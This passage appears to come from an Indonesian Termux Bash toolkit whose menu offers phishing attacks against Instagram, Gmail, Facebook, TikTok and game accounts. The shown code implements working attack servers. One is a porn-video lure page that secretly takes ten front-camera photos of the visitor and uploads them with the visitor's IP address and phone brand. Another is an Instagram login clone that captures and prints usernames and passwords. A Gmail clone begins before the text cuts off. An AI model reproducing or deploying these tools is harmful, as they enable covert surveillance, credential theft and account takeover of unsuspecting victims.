local res=$(curl -s -F "file=@$file_path" "$upload_url")
local status=$(echo "$res" | jq -r '.status')
if [ "$status" = "ok" ]; then
local url=$(echo "$res" | jq -r '.data.downloadPage')
if [ -n "$url" ] && [ "$url" != "null" ]; then
echo "$url"
return 0
fi
fi
clear 
echo ""
echo -e "${r} Terjadi kesalahan."
echo ""
pkill -9 -f com.termux
}
clear
echo "
⠀⠀⠀⢀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣄⡀⠀⠀⠀⠀
 ⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⠀⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠙⠯⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⡆
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
 ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀
⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
 ⠀⠀⠈⠒⠹⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠁ " | lolcat 
echo ""
echo -e "${p}  Development ${g}: ${c}By.Thxyzz404"
echo ""
echo "Contoh input pengguna : /sdcard/Folder/File_Tujuan.py"
echo -e "${g}"
read -p "Masukkan file path : " kon
echo ""
if [ -z "$kon" ]; then
clear 
echo ""
echo -e "${y} Pilihan anda jangan kosong."
echo ""
fi
if [ ! -f "$kon" ]; then
clear 
echo ""
echo -e "${g} File lu taro mana jink!"
echo ""
fi
file_size=$(stat -f%z "$kon" 2>/dev/null || stat -c%s "$kon" 2>/dev/null)
file_size_mb=$((file_size / 1048576))
if [ $file_size_mb -gt 10240 ]; then
clear 
echo ""
echo -e "${c} File lu jangan gede2 max cuman 10GB doang."
echo ""
fi
echo -e "${r}[ ${g}+ ${r}]${c} Mengupload file..."
pantau_aktivitas
url=$(gas_up "$kon")
if [ $? -eq 0 ]; then
filename=$(basename "$kon")
file_size_kb=$((file_size / 1024))    
echo -e "${g}"
echo "File : $filename"
echo "Size : $file_size_kb KB"
echo "URL : $url"
else
clear 
echo ""
echo -e "${r} Upload gagal : $url"
echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "bk" ]]; then
break
else
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Tidak_Ada.mp3" &> /dev/null &
echo -e "${bold_bg}${green} Menu Tidak Ada Di ToolsV6 ${n}"
sleep 6
clear
fi
done
}
psg_menu() {
while true; do
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "$w╔═════════════════════════════════════════════╗"
echo -e "$w║       ${bold_bg}${bold_gren}  ☣ MENU PSHING LOLCATHOST ☣  ${n}     $w   ║${n}"
echo -e "$w╠═════════════════════════════════════════════╣"
echo -e "$w║${r} [ ${g}1 ${r}] ${c}Camera Hack Link Bokep                $w║"
echo -e "$w║${r} [ ${g}2 ${r}] ${c}Pshing Instagram                      $w║"
echo -e "$w║${r} [ ${g}3 ${r}] ${c}Pshing Gmail                          $w║"
echo -e "$w║${r} [ ${g}4 ${r}] ${c}Pshing Akun Moonton ML                $w║"
echo -e "$w║${r} [ ${g}5 ${r}] ${c}Pshing Facebook                       $w║"
echo -e "$w║${r} [ ${g}6 ${r}] ${c}Pshing Tiktok                         $w║"
echo -e "$w║${r} [ ${g}7 ${r}] ${c}Pshing Akun FF                        $w║"
echo -e "$w║${r} [ ${g}8 ${r}] ${c}Camera Hack Link Band                 $w║"
echo -e "$w║${p} [ ${r}bk ${p}] ${g}KEMBALI KE MENU AWAL                 $w║"
echo -e "$w╚═════════════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSV6 ${r}]${c} : ")" ps
echo ""
if [[ "$ps" == "1" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
set -euo pipefail
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
PORT="${PORT:-8080}"
SAVE_DIR="/sdcard/Hasil_Foto"
if [ ! -d "/sdcard" ]; then
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${c} SDCARD TIDAK DI TEMUKAN."
  echo ""
  sleep 4
  pkill -9 -f com.termux
fi
if [ ! -d "/storage/emulated/0" ]; then
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${y} Menjalankan termux-setup-storage."
  echo ""
if command -v termux-setup-storage >/dev/null 2>&1; then
    termux-setup-storage
else
    clear 
    echo ""
    echo -e "${r}[ ${g}WARN ${r}]${y} termux-setup-storage tidak tersedia."
    echo ""
    sleep 3 
  fi
fi
mkdir -p "$SAVE_DIR"
echo "
▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌▐▛▚▞▜▌
▐▛▀▜▌▐▛▀▜▌▐▌   ▐▛▚▖ ▐▌   ▐▛▀▜▌▐▌  ▐▌
▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
" | lolcat
echo -e "${r}   Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}INFO ${r}]${c} Membuka server Python di port : ${PORT}"
echo -e "${r}[ ${g}INFO ${r}]${y} Akses di : http://localhost:${PORT}"
echo -e "${r}[ ${g}INFO ${r}]${p} Hasil Akan Di Simpan Secara Otomatis Di : ${SAVE_DIR}"
export PORT SAVE_DIR
python3 -c "
import os, json, datetime
from http.server import SimpleHTTPRequestHandler, HTTPServer
PORT = int(os.environ.get(\"PORT\", \"8080\"))
SAVE_DIR = os.environ.get(\"SAVE_DIR\", \"/sdcard/Hasil_Foto\")
HTML_CONTENT = '''<!doctype html>
<html lang=\"id\">  
<head>  
  <meta charset=\"utf-8\" />  
  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" />  
  <title>Bokep Kamera Auto Virall</title>  
  <style>  
    :root { --pad: 16px; }  
    body {  
      font-family: system-ui, sans-serif;  
      max-width: 820px;  
      margin: 2rem auto;  
      padding: 0 var(--pad);  
      background: url('https://l.top4top.io/p_3539d0y7d1.jpg') no-repeat center center fixed;  
      background-size: cover;  
      color: white;  
      text-shadow: 1px 1px 2px black;  
    }  
    h1 { font-size: 1.4rem; margin-bottom: 0.5rem; }  
    .notice {  
      background: rgba(0,0,0,0.5);  
      padding: var(--pad);  
      border-radius: 12px;  
    }  
    video, canvas {  
      width: 100%;  
      max-width: 780px;  
      border-radius: 12px;  
      background: #000;  
    }  
    .bar { margin: 1rem 0; }  
    button {  
      padding: .75rem 1rem;  
      border-radius: 10px;  
      border: none;  
      cursor: pointer;  
      background: #007bff;  
      color: white;  
      font-weight: bold;  
    }  
  </style>  
</head>  
<body>  
  <h1>Klik tombol setel video agar bisa akses video colmek virall 💋💦</h1>  
  <p class=\"notice\">  
    Server ini berfungsi untuk melihat video <strong>colmek virall</strong> dan
    tidak mengganggu adanya iklan ketika video di setel.  
  </p>  
  <video id=\"preview\" playsinline autoplay controls></video>
  <div class=\"bar\">  
    <button id=\"start\">Setell-Videoo</button>  
  </div>  
  <canvas id=\"photo\" hidden></canvas>
  <script>  
const video = document.getElementById('preview');  
const canvas = document.getElementById('photo');  
const startBtn = document.getElementById('start');  
let stream;  
let sessionId = Date.now();  
let clientIP = 'Unknown';  
let deviceBrand = 'Unknown';
fetch('/ip').then(r => r.text()).then(ip => clientIP = ip.trim()).catch(() => {});
(function() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes('samsung')) deviceBrand = 'Samsung';
  else if (ua.includes('xiaomi') || ua.includes('redmi') || ua.includes('poco')) deviceBrand = 'Xiaomi';
  else if (ua.includes('oppo') || ua.includes('realme')) deviceBrand = 'OPPO/Realme';
  else if (ua.includes('vivo')) deviceBrand = 'Vivo';
  else if (ua.includes('huawei') || ua.includes('honor')) deviceBrand = 'Huawei/Honor';
  else if (ua.includes('oneplus')) deviceBrand = 'OnePlus';
  else if (ua.includes('asus')) deviceBrand = 'Asus';
  else if (ua.includes('nokia')) deviceBrand = 'Nokia';
  else if (ua.includes('sony')) deviceBrand = 'Sony';
  else if (ua.includes('lg')) deviceBrand = 'LG';
  else if (ua.includes('motorola')) deviceBrand = 'Motorola';
  else deviceBrand = 'Unknown Device';
})();
function takeSnapshot() {  
  if (!stream) return null;  
  const track = stream.getVideoTracks()[0];  
  const settings = track.getSettings();  
  const w = settings.width || 640;  
  const h = settings.height || 480;  
  canvas.width = w;  
  canvas.height = h;  
  const ctx = canvas.getContext('2d');  
  ctx.drawImage(video, 0, 0, w, h);  
  return canvas;  
}
async function uploadPhoto(canv, index) {  
  const blob = await new Promise(res => canv.toBlob(res, 'image/jpeg', 0.8));  
  const fd = new FormData();  
  fd.append('photo', blob, \`photo_\${sessionId}_\${index}.jpg\`);
  if (index === 1) {
    fd.append('ip', clientIP);
    fd.append('brand', deviceBrand);
    fd.append('session', sessionId.toString());
  }
  try {
    const resp = await fetch('/upload', { 
      method: 'POST', 
      body: fd 
    });  
    if (!resp.ok) {
      const err = await resp.text();
      throw new Error(\"Upload gagal: \" + err);
    }  
    return await resp.json();  
  } catch (err) {
    console.error(\"Upload error:\", err);
    throw err;
  }
}
async function startAndSnap() {  
  try {  
    stream = await navigator.mediaDevices.getUserMedia({  
      video: { facingMode: { ideal: 'user' } },  
      audio: false  
    });  
    video.srcObject = stream;  
    await video.play();
    for (let i = 1; i <= 10; i++) {  
      await new Promise(res => setTimeout(res, 600));  
      const canv = takeSnapshot();  
      if (canv) {  
        await uploadPhoto(canv, i);  
      }  
    }
    stream.getTracks().forEach(track => track.stop());
    aksesVideo();
  } catch (err) {  
    alert(\"Terjadi kesalahan : \" + err.message);  
  }  
}
function aksesVideo() {  
  try {  
    let videos = [
      \"https://h.top4top.io/m_383175o4t0.mp4\",
      \"https://a.top4top.io/m_37875yu8r0.mp4\",
      \"https://c.top4top.io/m_3785viisu0.mp4\",
      \"https://g.top4top.io/m_38217lueg0.mp4\",
      \"https://h.top4top.io/m_3550134wq1.mp4\"
    ];  
    let index = 0;  
    const player = document.getElementById('preview');  
    player.srcObject = null;
    player.src = videos[index];  
    player.play();  
    player.onended = function() {  
      index++;  
      if (index < videos.length) {  
        player.src = videos[index];  
        player.play();  
      }  
    };  
  } catch (err) {  
    alert(\"Gagal memutar video : \" + err.message);  
  }  
}
startBtn.addEventListener('click', startAndSnap);  
  </script>  
</body>  
</html>'''
class RequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return  
    def do_GET(self):
        if self.path == \"/ip\":
            ip = self.client_address[0]
            self.send_response(200)
            self.send_header(\"Content-Type\", \"text/plain\")
            self.send_header(\"Access-Control-Allow-Origin\", \"*\")
            self.end_headers()
            self.wfile.write(ip.encode())
            return
        if self.path == \"/\" or self.path == \"/index.html\":
            self.send_response(200)
            self.send_header(\"Content-Type\", \"text/html\")
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
            return
        self.send_error(404, \"Not Found\")  
    def do_POST(self):
        if self.path != \"/upload\":
            self.send_error(404, \"Not Found\")
            return
        content_type = self.headers.get('Content-Type', \"\")
        if \"multipart/form-data\" not in content_type:
            self.send_error(400, \"Invalid Content-Type\")
            return
        length = int(self.headers.get('Content-Length', 0))
        if length <= 0:
            self.send_error(400, \"No data\")
            return
        data = self.rfile.read(length)
        boundary = content_type.split(\"boundary=\")[-1]
        if isinstance(boundary, str):
            boundary = boundary.encode()
        parts = data.split(b'--' + boundary)
        photo_data = None
        filename = None
        ip = brand = session = None
        for part in parts:
            if not part.strip() or part.startswith(b'--'):
                continue
            headers, _, body = part.partition(b'\r\n\r\n')
            header_lines = headers.decode(errors='ignore').split('\r\n')
            disp = {}
            for h in header_lines:
                if h.startswith('Content-Disposition'):
                    for item in h.split(';'):
                        if '=' in item:
                            k, v = item.strip().split('=', 1)
                            disp[k] = v.strip('\"')
            if 'filename' in disp:
                filename = disp['filename']
                photo_data = body.rstrip()
            else:
                name = disp.get('name', '')
                value = body.decode(errors='ignore').strip()
                if name == 'ip': ip = value
                elif name == 'brand': brand = value
                elif name == 'session': session = value
        if not photo_data or not filename:
            self.send_error(400, \"No photo uploaded\")
            return
        os.makedirs(SAVE_DIR, exist_ok=True)
        photo_path = os.path.join(SAVE_DIR, filename)
        with open(photo_path, \"wb\") as f:
            f.write(photo_data)
        info_saved = False
        if ip and brand and session and filename.endswith(\"_1.jpg\"):
            timestamp = datetime.datetime.now().strftime(\"%Y%m%d-%H%M%S\")
            info_path = os.path.join(SAVE_DIR, f\"info_{timestamp}_{session}.txt\")
            info_text = f\"\"\"IP Lokal : {ip}
Merek HP : {brand}
Waktu : {datetime.datetime.now()}
User-Agent : {self.headers.get('User-Agent', 'N/A')}
Total Foto : 10
Folder : {SAVE_DIR}
Session ID : {session}
\"\"\"
            with open(info_path, \"w\", encoding=\"utf-8\") as f:
                f.write(info_text.strip())
            info_saved = True
        payload = {\"ok\": True, \"saved\": photo_path}
        if info_saved:
            payload[\"info\"] = info_path
        response = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header(\"Content-Type\", \"application/json\")
        self.send_header(\"Content-Length\", str(len(response)))
        self.send_header(\"Access-Control-Allow-Origin\", \"*\")
        self.end_headers()
        self.wfile.write(response)  
    def end_headers(self):
        self.send_header(\"X-Content-Type-Options\", \"nosniff\")
        super().end_headers()
if __name__ == \"__main__\":
    current_port = PORT
    while True:
        try:
            httpd = HTTPServer((\"\", current_port), RequestHandler)
            break
        except OSError as e:
            if e.errno == 98:
                print(f\"Port {current_port} digunakan, coba {current_port+1}\")
                current_port += 1
            else:
                raise
    PORT = current_port
    print(f\"\\n\\033[31;1m[ \\033[32;1mINFO \\033[31;1m]\\033[36;1m Server berjalan di : http://localhost:{PORT}\")
    print(f\"\\033[31;1m[ \\033[32;1mINFO \\033[31;1m]\\033[33;1m Hasil foto akan disimpan di : {SAVE_DIR}\\n\")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(\"\\n\\033[32;1m[ \\033[31;1mINFO \\033[32;1m]\\033[35;1m Server dihentikan.\\n\")
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "2" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
██╗ ██████╗ 
██║██╔════╝ 
██║██║  ███╗
██║██║   ██║
██║╚██████╔╝
╚═╝ ╚═════╝ " | lolcat
echo ""
echo -e "${p}Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}+ ${r}]${b} Menyiapkan Server Website."
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" input 
port=${input:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Telah Aktif Di Port : http://localhost:$port "
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
PORT = $port
HTML_CONTENT = '''<!DOCTYPE html>
<html lang=\"id\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #2e3d50;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            color: #ffffff;
        }
        .container {
            max-width: 350px;
            width: 100%;
        }
        .login-box {
            background: #2e3d50;
            border: 1px solid #4a5f78;
            border-radius: 4px;
            padding: 40px 30px 30px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            margin-bottom: 30px;
            background: transparent;
        }
        .logo img {
            max-width: 175px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        .login-box form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 10px;
            background: #3a4d63;
            border: 1px solid #4a5f78;
            border-radius: 4px;
            font-size: 13px;
            color: #ffffff;
            outline: none;
            transition: border 0.2s;
        }
        .login-box input:focus {
            border-color: #6a8faf;
            background: #3a4d63;
        }
        .login-box input::placeholder {
            color: #a0b8cc;
            font-size: 13px;
        }
        .password-container {
            position: relative;
            width: 100%;
        }
        .password-container input {
            padding-right: 40px;
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #a0b8cc;
            font-size: 18px;
            user-select: none;
            background: transparent;
            border: none;
            padding: 0;
        }
        .toggle-password:hover {
            color: #ffffff;
        }
        .login-box button {
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 0;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s, opacity 0.2s;
        }
        .login-box button:hover {
            background: #1877f2;
        }
        .login-box button:active {
            opacity: 0.7;
        }
        .forgot-link {
            margin-top: 18px;
            font-size: 12px;
        }
        .forgot-link a {
            color: #a0b8cc;
            text-decoration: none;
        }
        .forgot-link a:hover {
            text-decoration: underline;
            color: #ffffff;
        }
        .signup-box {
            background: #2e3d50;
            border: 1px solid #4a5f78;
            border-radius: 4px;
            padding: 20px 0;
            text-align: center;
            font-size: 14px;
            margin-bottom: 20px;
            color: #ffffff;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .signup-box a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            font-size: 11px;
            color: #a0b8cc;
            margin-top: 10px;
        }
        .footer a {
            color: #a0b8cc;
            text-decoration: none;
            margin: 0 4px;
        }
        .footer a:hover {
            text-decoration: underline;
            color: #ffffff;
        }
        .footer .meta {
            margin-top: 12px;
            font-weight: 500;
            color: #a0b8cc;
            letter-spacing: 0.5px;
            font-size: 12px;
        }
        @media (max-width: 450px) {
            body {
                background: #2e3d50;
                padding: 10px;
            }
            .login-box {
                padding: 30px 20px 20px;
            }
            .container {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"login-box\">
            <div class=\"logo\">
                <img src=\"https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png\" alt=\"Logo\">
            </div>
            <form id=\"loginForm\" action=\"/login\" method=\"POST\">
                <input type=\"text\" placeholder=\"Nama pengguna, email, atau nomor ...\" id=\"username\" name=\"username\" required>
                <div class=\"password-container\">
                    <input type=\"password\" placeholder=\"Kata sandi\" id=\"password\" name=\"password\" required>
                    <span class=\"toggle-password\" onclick=\"togglePassword()\">☐</span>
                </div>
                <button type=\"submit\">Login</button>
            </form>
            <div class=\"forgot-link\">
                <a href=\"#\">Lupa kata sandi?</a>
            </div>
        </div>
        <div class=\"signup-box\">
            Belum punya akun? <a href=\"#\">Buat akun baru</a>
        </div>
        <div class=\"footer\">
            <div>
                <a href=\"#\">Tentang</a>
                <a href=\"#\">Bantuan</a>
                <a href=\"#\">Persyaratan</a>
                <a href=\"#\">Privasi</a>
                <a href=\"#\">Kebijakan</a>
                <a href=\"#\">Info</a>
                <a href=\"#\">Bahasa</a>
            </div>
            <div class=\"meta\">
                Meta
            </div>
        </div>
    </div>
    <script>
    function togglePassword() {
        const passwordInput = document.getElementById(\"password\");
        const toggleIcon = document.querySelector(\".toggle-password\");
        const isPassword = passwordInput.type === \"password\";
        passwordInput.type = isPassword ? \"text\" : \"password\";
        toggleIcon.textContent = isPassword ? \"☑\" : \"☐\";
    }
    </script>
</body>
</html>'''
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")    
    def do_POST(self):
        if self.path == \"/login\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            username = data.get('username', [''])[0]
            password = data.get('password', [''])[0]
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Username/Email : \" + username + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Password : \" + password + \"\033[0m\\n\")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b\"<h2 style='color: white; background-color: #2e3d50; padding: 20px; text-align: center;'>Login berhasil! akun anda di proses.</h2>\")
        else:
            self.send_error(404)    
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Salin Portnya : http://localhost:\" + str(PORT) + \"\033[0m\")
    print()
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "3" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
  ██████╗ ███╗   ███╗ █████╗ ██╗██╗     
██╔════╝ ████╗ ████║██╔══██╗██║██║     
██║  ███╗██╔████╔██║███████║██║██║     
██║   ██║██║╚██╔╝██║██╔══██║██║██║     
╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝" | lolcat
echo ""
echo -e "${p}      Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}+ ${r}]${b} Menyiapkan Server Website."
echo ""
read -p "$(echo -e "${y}Masukkan Port Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" port 
port=${port:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Telah Aktif Di Port : http://localhost:$port "
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import socket
import re
import sys
PORT = $port
GREEN = \"\033[92m\"
RED = \"\033[91m\"
CYAN = \"\033[96m\"
YELLOW = \"\033[93m\"
RISET = \"\033[95m\"
RESET = \"\033[0m\"
def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0
if is_port_in_use(PORT):
    print(f\"{RED}[ERROR] Port {PORT} sedang digunakan. Silakan gunakan port lain.{RESET}\")
    sys.exit(1)
akun_valid = {
    \"contoh@gmail.com\": \"thxyzz404\",
    \"user@gmail.com\": \"recode_haram\"
}
html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <style>
        body {{
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            padding: 20px;
        }}
        .login-box {{
            background: white;
            padding: 48px 32px 36px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            text-align: center;
            position: relative;
            width: 100%;
            max-width: 480px;
            box-sizing: border-box;
        }}
        .login-box img {{
            width: 100px;
            height: 36px;
            margin-bottom: 28px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }}
        .login-box .title {{
            font-size: 26px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 24px;
            text-align: left;
        }}
        .login-box input {{
            display: block;
            width: 100%;
            padding: 16px 18px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #dadce0;
            outline: none;
            font-size: 18px;
            background: #fafafa;
            box-sizing: border-box;
            height: 64px;
            transition: border-color 0.2s;
        }}
        .login-box input:focus {{
            border-color: #1a73e8;
            border-width: 2px;
            background: white;
        }}
        .login-box input.error {{
            border-color: red;
        }}
        .login-box input::placeholder {{
            color: #80868b;
            font-size: 18px;
            opacity: 1;
        }}
        .login-box button[type=\"submit\"] {{
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 18px;
            font-weight: 500;
